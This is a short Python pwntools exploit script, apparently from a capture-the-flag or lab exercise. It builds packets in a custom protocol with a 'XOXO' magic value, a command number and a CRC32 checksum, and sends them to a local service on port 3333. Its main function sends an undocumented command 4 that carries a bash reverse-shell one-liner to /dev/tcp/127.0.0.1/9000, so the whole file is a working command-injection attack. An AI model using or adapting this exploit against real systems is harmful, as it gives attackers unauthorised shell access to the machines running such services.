#!/usr/bin/env python3

from pwn import *
import struct
import zlib
import sys

context.log_level = "debug"
HOST = "127.0.0.1"
PORT = 3333

MAGIC = b"XOXO"

CMD_WEBSERVER = 1
CMD_MARIADB   = 2
CMD_BOTH      = 3


def build_packet(command, command_pkt=b""):
    command_pkt = command_pkt.ljust(64, b"\x00")
    data = (
        MAGIC +
        struct.pack("!I", command) +
        command_pkt
    )
    crc = zlib.crc32(data) & 0xffffffff
    packet = data + struct.pack("!I", crc)
    return packet


def send_command(command, command_pkt=b""):
    packet = build_packet(command, command_pkt)

    log.info(f"Connecting to {HOST}:{PORT}")
    io = remote(HOST, PORT)

    log.info(f"Sending command {command}")
    log.debug(f"Packet:\n{hexdump(packet)}")

    io.send(packet)

    try:
        response = io.recvline(timeout=5)
        print(response.decode(errors="replace").strip())
    except EOFError:
        log.failure("Connection closed without response")

    io.close()


def main():
    send_command(
        4, command_pkt=b"/bin/bash -c 'sh -i >& /dev/tcp/127.0.0.1/9000 0>&1'"
    )

if __name__ == "__main__":
    main()
